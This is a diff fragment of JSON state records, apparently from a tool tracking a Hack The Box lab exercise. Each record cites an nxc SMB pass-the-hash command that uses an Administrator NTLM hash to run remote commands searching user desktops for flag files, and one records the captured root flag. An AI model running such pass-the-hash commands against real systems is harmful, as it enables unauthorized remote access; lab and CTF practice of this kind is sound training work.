+        "source": "nxc smb 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\" 2>nul'",
+        "created_at": 1791773966.09
+      },
+      {
+        "kind": "host.os_hint",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "nxc",
+          "evidence": "Windows command execution output"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\" 2>nul'",
+        "created_at": 1791773966.09
+      },
+      {
+        "kind": "host.os_family",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "family": "windows",
+          "confidence": "high",
+          "tool": "nxc",
+          "evidence": "Windows command execution output"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\" 2>nul'",
+        "created_at": 1791773966.09
+      },
+      {
+        "kind": "objective.root_flag",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "flag": "3212d65e50aa8080122607a5be3e475c",
+          "slot": "root",
+          "name": "root.txt",
+          "path": "root.txt"
+        },
+        "state": "supported",
+        "source": "nxc smb 10.129.105.202 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\" 2>nul'",
+        "created_at": 1791773966.091
+      }
+    ],
+    "ui": {
+      "wsScaffoldDone": true,
+      "prepDone": {
+        "ul:160og31": true,
+        "hf:sq0zti": true,
+        "hosts:n7wdku": true
+      }
+    },
+    "workspace": {
+      "root": "~/ctf/htb/windows/forest"
+    },
+    "activeTarget": null
+  }
+}
